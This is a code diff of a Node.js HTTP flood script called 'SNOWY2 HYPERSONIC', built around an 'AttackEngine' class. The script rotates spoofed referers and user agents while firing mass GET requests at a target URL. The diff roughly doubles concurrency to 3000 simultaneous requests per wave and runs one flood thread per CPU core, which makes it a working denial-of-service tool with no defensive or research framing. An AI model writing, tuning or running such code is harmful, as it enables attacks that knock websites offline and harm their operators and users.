@@ -1,19 +1,14 @@
 const axios = require('axios');
 const fs = require('fs');
 const os = require('os');
-const http = require('http');
-const https = require('https');
 const process = require('process');
 
-const FIXED_CONCURRENCY = 1500; // Reduced concurrency to 1500
-const CPU_COUNT = os.cpus().length;
-const REQUEST_TIMEOUT = 8000;
+const FIXED_CONCURRENCY = 3000; // Increased concurrency
+const REQUEST_TIMEOUT = 8000; // Reduced timeout
+const THREAD_COUNT = os.cpus().length; // Dynamically set based on available cores
 
 const REFERERS = loadLines('refs.txt');
 const USER_AGENTS = loadLines('ua.txt');
-
-const httpAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity });
-const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: Infinity });
 
 function loadLines(file) {
     try {
@@ -40,8 +35,6 @@ class AttackEngine {
         this.duration = duration * 1000;
         this.startTime = Date.now();
         this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
-        this.fx = ['⚡', '🚀', '💣', '🔥', 'BLAST', 'ZAP', 'RUSH', '⚔️', '⚙️'];
-        this.fxIndex = 0;
     }
 
     async fireRequest() {
@@ -55,8 +48,6 @@ class AttackEngine {
             await axios.get(this.target, {
                 headers,
                 timeout: REQUEST_TIMEOUT,
-                httpAgent,
-                httpsAgent,
                 maxRedirects: 0,
                 validateStatus: null,
                 decompress: false
@@ -69,50 +60,43 @@ class AttackEngine {
 
     async boosterThread() {
         while (Date.now() - this.startTime < this.duration) {
-            const res = await this.fireRequest();
-            this.stats.total++;
-            res ? this.stats.success++ : this.stats.errors++;
+            const results = await Promise.allSettled(
+                Array.from({ length: FIXED_CONCURRENCY }, () => this.fireRequest())
+            );
+            results.forEach(res => {
+                this.stats.total++;
+                if (res.status === 'fulfilled' && res.value) {
+                    this.stats.success++;
+                } else {
+                    this.stats.errors++;
+                }
+            });
         }
     }
 
-    async fixedFloodWave() {
-        const batch = Array.from({ length: FIXED_CONCURRENCY }, () => this.fireRequest());
-        const results = await Promise.allSettled(batch);
-        results.forEach(res => {
-            this.stats.total++;
-            if (res.status === 'fulfilled' && res.value) {
-                this.stats.success++;
-            } else {
-                this.stats.errors++;
-            }
-        });
-    }
-
-    displayLive() {
-        const elapsed = (Date.now() - this.startTime) / 1000;
-        const rps = (this.stats.total / elapsed).toFixed(1);
-        this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
-        const fx = this.fx[this.fxIndex++ % this.fx.length];
-        process.stdout.write(`\r${fx} RPS: ${rps} | HIT: ${this.stats.success} | ERR: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`);
-    }
-
     async run() {
-        console.log(`\nSNOWY2 HYPERSONIC - ${FIXED_CONCURRENCY} CONC`);
+        console.log(`\nSNOWY2 - HYPERSONIC MODE`);
         console.log('='.repeat(60));
         console.log(`TARGET: ${this.target}`);
         console.log(`DURATION: ${this.duration / 1000}s`);
         console.log('='.repeat(60));
 
-        const statTicker = setInterval(() => this.displayLive(), 100);
-        const boosters = [this.boosterThread()]; // Just 1x booster thread for now
+        const statTicker = setInterval(() => this.displayStats(), 100);
+        const boosters = Array.from({ length: THREAD_COUNT }, () => this.boosterThread());
 
         while (Date.now() - this.startTime < this.duration) {
-            await this.fixedFloodWave();
+            await Promise.allSettled(boosters);
         }
 
         clearInterval(statTicker);
-        await Promise.allSettled(boosters);
         this.printResults();
+    }
+
+    displayStats() {
+        const elapsed = (Date.now() - this.startTime) / 1000;
+        const rps = (this.stats.total / elapsed).toFixed(1);
+        this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
+        process.stdout.write(`\r🔥 RPS: ${rps} | HIT: ${this.stats.success} | ERR: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`);
     }
 
     printResults() {
@@ -129,7 +113,7 @@ class AttackEngine {
     }
 }
 
-// NO QUESTIONS. JUST GO.
+// Main execution
 (async () => {
     const readline = require('readline').createInterface({
         input: process.stdin,
